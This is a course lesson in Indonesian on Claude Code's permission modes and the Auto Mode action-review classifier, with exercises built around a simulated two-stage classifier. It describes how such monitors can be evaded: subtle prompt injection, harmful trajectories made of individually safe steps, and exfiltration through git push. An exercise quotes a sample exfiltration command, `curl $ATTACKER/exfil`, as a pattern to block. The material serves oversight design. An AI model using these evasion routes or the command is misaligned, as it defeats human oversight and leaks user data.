# Mode Izin untuk Agen Otonom

> Tangga izin — level otonomi bertingkat dari reviu-setiap-aksi hingga setujui-semua — adalah cara harness mengatur apa yang boleh dilakukan agen otonom tanpa bertanya. Claude Code, contoh yang dikerjakan pelajaran ini, mengekspos enam mode semacam itu: "plan" bertanya sebelum setiap aksi, "default" (berlabel "Manual" di UI) hanya bertanya untuk yang berisiko, "acceptEdits" menyetujui otomatis penulisan file tetapi masih mengonfirmasi eksekusi shell, dan "bypassPermissions" menyetujui semuanya. Auto Mode — permission mode `auto` — mengganti persetujuan per aksi dengan model classifier terpisah yang mereviu setiap aksi sebelum berjalan dan memblokir apa pun yang bereskalasi melampaui yang diminta permintaan. Anggaran aksi ditegakkan lewat `max_turns` dan `max_budget_usd`. Ketersediaan `auto` bergantung pada plan, enablement org, model, dan penyedia — dan Anthropic eksplisit bahwa classifier saja tidak cukup.

**Type:** Learn
**Languages:** Python (stdlib, two-stage classifier simulator)
**Prerequisites:** Phase 15 · 01 (Long-horizon agents), Phase 15 · 09 (Coding-agent landscape)
**Time:** ~45 minutes

## Masalahnya

Agen koding otonom di mesinmu adalah kategori keamanan tersendiri. Permukaan serangannya adalah semua yang bisa dijangkau agen — filesystem, jaringan, kredensial, clipboard, tab browser apa pun, terminal terbuka apa pun. Bruce Schneier dan lainnya menandai ini secara publik: agen computer-use bukan "pembaruan fitur" chatbot, mereka adalah jenis tool baru dengan profil risiko baru.

Sistem izin Claude Code adalah jawaban Anthropic. Alih-alih satu sakelar "otonom / tidak otonom", ada enam mode yang membentang di tangga kapabilitas: plan → default → acceptEdits → … → bypassPermissions. Setiap mode adalah tradeoff berbeda antara kecepatan dan reviu-per-aksi. Auto Mode (Maret 2026) menambahkan model classifier terpisah yang memindahkan persetujuan dari jalur kritis pengguna: ia mereviu setiap aksi sebelum berjalan dan memblokir apa pun yang bereskalasi melampaui permintaan.

Pertanyaan engineering-nya: apa yang ditangkap sistem ini, apa yang terlewat, dan mode mana yang sebenarnya layak untuk tugas tertentu?

## Konsepnya

### Keenam mode izin

| Mode | Behavior | When to use |
|---|---|---|
| `plan` | Agent proposes a plan; user approves the whole plan; every action is reviewed before execution | Unfamiliar task; prod-adjacent code; first time using the agent on a repo |
| `default` | Labeled "Manual" in the UI. Agent runs actions; prompts user for any "risky" action (shell exec, destructive operations, network calls) | Most interactive coding sessions |
| `acceptEdits` | File writes auto-approve; shell exec and network calls still prompt | Refactoring pass across many files |
| `auto` | A separate classifier model reviews each action before it runs; blocks anything escalating beyond the request | Long-horizon unattended runs in a constrained workspace |
| `dontAsk` | Never prompts; actions not pre-approved by permission rules are denied | Ephemeral sandboxes, CI jobs, research scripts |
| `bypassPermissions` | Approves everything | Documented as "only inside ephemeral containers you are willing to throw away" |

(Nama di atas cocok dengan dok publik Claude Code; UI melabeli `default` sebagai "Manual".)

### Auto Mode dalam satu halaman

Auto Mode (diluncurkan 24 Maret 2026) adalah mode izin pertama yang mendelegasikan persetujuan per aksi ke sebuah model. Strukturnya:

1. **Model classifier terpisah.** Mereviu setiap aksi yang diusulkan sebelum berjalan, dinilai terhadap tugas yang dideklarasikan dan status sesi saat ini, dan memblokir apa pun yang bereskalasi melampaui yang diminta permintaan. Aksi yang diblokir kembali ke pengguna.
2. **Ketersediaan bergerbang.** Apakah `auto` ditawarkan sama sekali bergantung pada plan, enablement organisasi, model, dan penyedia.

Kontrol anggaran berada di samping classifier:

- `max_turns` — total iterasi dalam sebuah sesi.
- `max_budget_usd` — batas dolar yang menghentikan sesi.
- batas jumlah-aksi per tool (tidak lebih dari N panggilan `WebFetch`, dst.).

### Apa yang ditangkap sistem

- Injeksi prompt langsung ke input tool tempat instruksi suntikan memetakan ke bentuk aksi berisiko-dikenal.
- Loop tool repetitif — classifier bisa melihat aksi N+1 nyaris identik dengan aksi N, lima kali berturut-turut.
- Perintah shell yang jelas di luar scope pada sesi yang seharusnya hanya edit-file.

### Apa yang bisa terlewat sistem

- **Injeksi prompt subtil** yang memodulasi perilaku tanpa menghasilkan satu aksi yang ditandai. Injeksi prompt tidak langsung bukan kerentanan yang bisa dipatch penuh (kepala preparedness OpenAI, 2025, tentang agen browser — lihat Pelajaran 11).
- **Perilaku salah tingkat-semantik.** Setiap aksi individual bisa tampak aman sementara trajektori gabungannya berbahaya. Classifier menilai aksinya; ia tidak menurunkan ulang intensi pengguna.
- **Eksfiltrasi lewat kanal yang sah.** Menulis data ke file milikmu, lalu `git push` ke repo publik, adalah rangkaian aksi yang diizinkan yang komposisinya adalah masalahnya.

### Bingkai pratinjau riset

Anthropic mengirim Auto Mode sebagai pratinjau riset. Dokumentasinya eksplisit bahwa classifier adalah sebuah lapisan, bukan solusi: pengguna diharapkan menggabungkan Auto Mode dengan anggaran, allowlist, workspace terisolasi, dan audit trajektori (Pelajaran 12–16). Bingkai pratinjau juga mencerminkan kesenjangan evaluasi-vs-deployment yang terdokumentasi (Pelajaran 1) — classifier yang lolos eval offline bisa berperilaku berbeda dalam sesi nyata tempat konteks pengguna ambigu.

### Di mana tangga ini berada dalam alur kerjamu

- Tugas yang asing: mulai di `plan`. Membaca rencana lebih murah dibanding me-rollback proses yang buruk.
- Refaktor yang dikenal: `acceptEdits` menghemat banyak klik konfirmasi.
- Proses latar tanpa pengawasan: `auto` hanya di dalam workspace yang blast radius-nya sudah kamu ukur (tanpa kredensial, tanpa mount produksi, tanpa egress yang tidak kamu opt-in).
- Kontainer efemeral: `dontAsk` / `bypassPermissions` bisa diterima jika dan hanya jika kontainer dan kredensialnya sekali pakai.

```figure
autonomy-oversight
```

## Gunakan

`code/main.py` mensimulasikan classifier reviu-aksi sebagai pipeline dua-tahap — penyederhanaan pengajaran; mode `auto` yang nyata didukung model classifier terpisah, bukan kontrak dua-tahap yang didokumentasikan. Tahap 1 adalah aturan kata kunci murah atas aksi yang diusulkan; Tahap 2 adalah reviewer multi-aturan yang lebih lambat. Driver memasukkan trajektori sintetis pendek (aksi aman, upaya injeksi-prompt, loop repetitif) dan menunjukkan di mana classifier menangkap dan di mana ia terlewat.

## Rilis

`outputs/skill-permission-mode-picker.md` mencocokkan deskripsi tugas dengan mode izin yang tepat, batas anggaran, dan isolasi yang disyaratkan.

## Latihan

1. Jalankan `code/main.py`. Jenis aksi sintetis mana yang tidak pernah ditandai Tahap 1 tetapi selalu tertangkap Tahap 2? Mana yang tidak tertangkap keduanya?

2. Perluas set aturan Tahap 1 untuk menangkap bentuk buruk-dikenal spesifik (mis. `curl $ATTACKER/exfil`). Ukur false-positive rate pada sampel aksi-benign.

3. Baca dok "How the agent loop works" dari Anthropic. Daftarkan setiap status eksternal yang disentuh agen secara default dalam mode `default`. Mana yang perlu kamu gerbangi terpisah sebelum menjalankan `auto` tanpa pengawasan?

4. Rancang anggaran proses 24 jam tanpa pengawasan: `max_turns`, `max_budget_usd`, batas per tool, allowlist. Justifikasi setiap angka.

5. Jelaskan satu trajektori tempat setiap aksi individual disetujui classifier, tetapi perilaku gabungannya misaligned. (Pelajaran 14 membahas bagaimana kill switch dan token canary menangani ini.)

## Key Terms

| Term | What people say | What it actually means |
|---|---|---|
| Permission mode | "How much the agent can do" | One of six named policies controlling per-action approval |
| plan mode | "Ask before anything" | Agent writes a plan; user approves before execution |
| acceptEdits | "Let it write files" | File writes auto-approve; shell exec still prompts |
| auto | "Auto approvals" | Separate classifier model reviews each action; blocks escalation beyond the request |
| bypassPermissions | "Full YOLO" | Approves everything; intended for ephemeral containers |
| Stage 1 (simulator) | "Fast keyword check" | Cheap rule over proposed actions in `code/main.py` |
| Stage 2 (simulator) | "Deep review" | Slower multi-rule reviewer for flagged actions in `code/main.py` |
| Research preview | "Not GA" | Anthropic framing for features whose failure mode is still being mapped |

## Further Reading

- [Anthropic — How the agent loop works](https://code.claude.com/docs/en/agent-sdk/agent-loop) — permission modes, budgets, action format.
- [Anthropic — Claude Managed Agents overview](https://platform.claude.com/docs/en/managed-agents/overview) — managed-service execution model.
- [Anthropic — Claude Code product page](https://www.anthropic.com/product/claude-code) — feature surface and Auto Mode announcement.
- [Anthropic — Claude's Constitution (January 2026)](https://www.anthropic.com/news/claudes-constitution) — the reason-based layer that shapes classifier judgments.
- [Anthropic — Measuring agent autonomy in practice](https://www.anthropic.com/research/measuring-agent-autonomy) — internal perspective on long-horizon permission design.
